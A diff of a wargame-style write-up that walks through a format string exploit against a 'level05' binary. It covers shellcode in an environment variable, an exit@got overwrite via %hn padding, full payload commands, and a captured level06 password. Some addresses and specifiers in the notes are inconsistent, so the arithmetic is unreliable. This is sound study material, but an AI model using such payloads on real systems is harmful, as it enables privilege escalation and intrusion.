@@ -1,121 +1,151 @@
-exit@got:   0x08048376   <==>   \x76\x83\x04\x08
-system:     0xf7e6aed0
+1. Understand the binary
+
+We've started executing the binary to see what was asking.
+
+It asked for an input and it was printing the input.
+
+We've opened the binary with gdb and running the 'info functions' command we've seen that printf was called.
+
+We've started to test to see if a Format String Vulnerability was present.
+
+We've tested with multiple inputs:
+	- %p %p %p %p: printed some address
+	- %s: Segmentation fault (core dumped)
+
+With this tests we've undestood that in the code there was something like this:
+
+int main()
+{
+	char s[100];
+	fgets(s, 100, stdin);
+	printf(s); <-- vulnerable printf
+	exit (0);
+}
+
+2. Format String Exploit
+
+A FSE is an exploit based on injecting, using the vulnerable printf, some shellcode at a address
+in memory that will be called at some point in the program. To do this we need to choose a address
+from the Global Offset Table. In our program we choosed to inject the shellcode at the exit@got address
+since is the only funciton that we have after the printf.
+
+To do a FSE we need:
+	- Shellcode to export as a variable in the env that execute a /bin/sh.
+	- Find the address of the exported variable using gdb during program execution and the address
+	  of the exit on the GOT.
+	- Find the position on the Stack relative to our printf to understand where to write the address of
+	  the env variable.
+	- Build a payload to overwrite the exit address with the shellcode env var address.
+	- Write the shellcode at the address using python and the payload.
+
+We found online a bytecode that execute a /bin/sh (shellcode):
+
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80
+
+That is the bytecode for more or less this program:
+
+int main() 
+{
+    execve("/bin/sh", NULL, NULL);
+
+    return (0);
+}
+
+We exported the shellcode using python -c to add a NOP sled beginning of the env variable.
+A NOP sled is a series of identical values in memory that instruct the CPU to take no action
+and proceed to the next instruction. In our case we used \x90 as character (for Intel).
+
+export SHELLCODE=$(python -c "print '\x90' * 200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80' ")
+
+The NOP sled length is arbitrary as long as it overflows the env entry into another address.
 
 
-# Need to overwrite 0x08048376 (QT.exit) with 0xf7e6aed0 (LIBC .system)
+After we run
 
-# It means writing 0xf7e6 (63462) @ 0x08048376 + 2 = 0xf7e5eb72 (high order)
-#              and 0xaed0 (44752) @ 0x08048376 (low order)
-We need to identify exit@got pointer
+gdb level05 
 
-exit@got    = 0x080497e0
+put a breakpoint on main
 
-Then we find our shellcode to inject:
+b main
 
-shellcode   = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80
-inject it into the env with:
-
-python -c "print '\x90' * 420 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80'"
-
-The nopsled is arbitrary as long as it overflows the env entry into another address
-
-Then launch level05 with gdb, breakpoint at main, then do:
+run the code and examinated the first 200 environ addesses at the breakpoint using
 
 x/200s environ
 
-To check where in the memory the shellcode entry is located, choose the last one
+and we found the end of the shellcode address:
 
-For example: 0xffffd8b6
+0xffffd8ca:	 "\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\207\343\260\v̀".
 
-Now quit gdb and convert both half of the adress into decimal values:
+Now we disassembled exit
 
+disas exit
 
-ffff = 65535
-d8b6 = 55478
+0x08048370 <+0>:	jmp    *0x80497e0 <-- jump to the call on the GOT
+0x08048376 <+6>:	push   $0x18
+0x0804837b <+11>:	jmp    0x8048330
 
-Substract both to get the range
+and we examine the jump address to find the GOT address
 
-65535 - 55478 = 10057
+x 0x80497e0
 
-Now we have everything we need,; just build the payload like this:
-
-# Now we can construct the exploit (note our write offset is %4 so we want [%10,%11] as offsets instead of [%7,%8]) :
-It'll be :  \x76\x83\x04\x08\x78\x83\x04\x08%44744x%4$hn%18710x%5$hn.
-Let me explain :    \x76\x83\x04\x08 or 0x08048376 (in reverse order) points to the low order bytes.
-                    \x78\x83\x04\x08 or 0x08048378 (in reverse order) points to the high order bytes.
-                    %44744× will write 44744 bytes on the standard output.
-                    %10$hn will write 8 + 44744 = 44752 bytes (or 0xaed0) at the first address specified (0xf7e5eb70).
-                    %18710x will write 18710 bytes on the standard output.
-                    %11$h will write 8 + 44744 + 18710 = 63462 (or 0xf7e6) at the second address specified (0xf7e5eb72).
-
-And now as usual:
-
-python -c "print '\x76\x83\x04\x08 \x78\x83\x04\x08 %44744x %10$hn %18710x %11$hn'" > /tmp/exploit
-cat /tmp/exploit - | ./level5
+0x80497e0 <exit@got.plt>:	0x08048376
 
 
+To find our write offset for the shellcode env var address we can test using
+AAAA and a %p. When the output will be 0x41414141 (A = 41 in hex) it means we have found the
+right position.
 
-printf:     0x080497d4   <==>   \xd4\x97\x04\x08
-system:     0xf7e6aed0
+AAAA%10$p
+aaaa0x61616161 (61 because level05 binary do a tolowercase before printing the input)
 
-# Need to overwrite 0x80497d4 (QT.exit) with 0xf7e6aed0 (LIBC .system)
 
-# It means writing 0xf7e6 (63462) @ 0x80497d4 + 2 = 0x80497d6 (high order)
-#              and 0xaed0 (44752) @ 0x80497d4 (low order)
+So we need to overwrite 0x080497e0 (exit@got) with 0xffffd8ca (shellcode in env) at postion 10 on the Stack.
 
-# Now, we have to figure out the value to set for the padding. Here is the formula
+Since we have to write 4294957258 chars (0xffffd8ca in decimal) at a specific address that are too many,
+we need to divide between the higher and lower order bytes of the address.
+
+It means writing 0xffff (65535) @ 0x080497e0 + 2 = 0x080497e2 (high order)
+             and 0xd8ca (55498) @ 0x080497e0 (low order)
+
+Now, we have to figure out the value to set for the padding. Here is the formula
+
 [The value we want] - [The bytes alredy wrote] = [The value to set].
-# Let's start with the low order bytes :
-It'll will be 44752 - 8 = 44744, because we already wrote 8 bytes (the two 4 bytes addresses).
 
-# Then, the high order bytes :
-It'll will be 63462 - 44752 = 18710, because we already wrote 44752 bytes (the two 4 bytes addresses and 44744 bytes from the previous writing).
+Let's start with the low order bytes :
 
-# Now we can construct the exploit (note our write offset is %10 so we want [%10,%11] as offsets instead of [%7,%8]) :
-It'll be :  \x70\xeb\xe5\xf7\x72\xeb\xe5\xf7%44744x%4$hn%18710x%5$hn.
-Let me explain :    \xd4\x97\x04\x08 or 0x80497d4 (in reverse order) points to the low order bytes.
-                    \xd6\x97\x04\x08 or 0x80497d6 (in reverse order) points to the high order bytes.
-                    %44744× will write 44744 bytes on the standard output.
-                    %10$hn will write 8 + 44744 = 44752 bytes (or 0xaed0) at the first address specified (0x80497d4).
-                    %18710x will write 18710 bytes on the standard output.
-                    %11$h will write 8 + 44744 + 18710 = 63462 (or 0xf7e6) at the second address specified (0x80497d6).
+It'll will be 55498 - 8 = 55490, because we already wrote 8 bytes (the two 4 bytes addresses).
 
+Then, the high order bytes :
 
-python -c "print '\xd4\x97\x04\x08\xd6\x97\x04\x08%44744x%10$hn%18710x%11$hn'" > /tmp/payload
+It'll will be 65535 - 55498 = 10037, because we already wrote 55498 bytes (the two 4 bytes addresses and 55490
+bytes from the previous writing).
 
+Now we can build our exploit:
 
-printf disas main: 08 04 83 40 <==> \x40\x83\x04\x08
+\xe2\x97\x04\x08
 
+It'll be: \xe0\x97\x04\x08 \xe2\x97\x04\x08 %55490x %10$hn %10037x %11$hn
 
-exit@got = 0x08048376  08 04 83 76 \x76\x83\x04\x08
+- \xe0\x97\x04\x08 or 0x080497e0 (in reverse order) points to the low order bytes.
+- \xe2\x97\x04\x08 or 0x080497e2 (in reverse order) points to the high order bytes.
+- %55490× will write 55490 bytes on the standard output.
+- %10$hn will write 8 + 55490 = 55498 bytes (or 0xd8ca) at the first address specified (0x080497e0).
+- %10037x will write 10037 bytes on the standard output.
+- %11$hn will write 8 + 55490 + 10037 = 65535 (or 0xffff) at the second address specified (0x080497e2).
 
-env var address = 0xffffdd76
+Now as usual:
 
-ffff = 65535
+python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55490x' + '%10\$n' + '%10037x' + '%11\$n'" > /tmp/exploit
 
-dd76 = 56694
+                                                                           ^                      ^
+																	We need to escape the two $ for the shell.
 
-56694 - 8 = 56686
+cat /tmp/exploit - | ./level05
 
-65535 - 56694 = 8841
+Now we are in a shell with level06 privileges
 
-\x76\x83\x04\x08
+whoami
+level06
 
-\x78\x83\x04\x08
-
-python -c "print '\x76\x83\x04\x08' + '\x78\x83\x04\x08' + '%56686x' + '%10$n' +  '%8841x' + '%11$n'" > /tmp/exploit
-
-
-This shellcode is a sequence of machine code instructions that is typically used to perform a specific task on a target system, such as launching a shell. The specific task performed by this shellcode is to execute a shell.
-
-The shellcode contains the following instructions:
-
-\x31\xc0: xor the EAX register with itself, effectively setting it to zero.
-\x50: push the value of the EAX register onto the stack.
-\x68\x2f\x2f\x73\x68: push the string "/bin//sh" onto the stack.
-\x68\x2f\x62\x69\x6e: push the string "/bin" onto the stack.
-\x87\xe3: xor the ESP register with the EBX register, effectively placing the string "/bin//sh" in the EBX register.
-\xb0\x0b: move the value 11 into the AL register. This value is the system call number for execve.
-\xcd\x80: issue an interrupt to execute the system call.
-
-Taken together, these instructions set up and execute a system call to run the "/bin/sh" command, which launches a shell.
+cat ~level06/.pass                
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
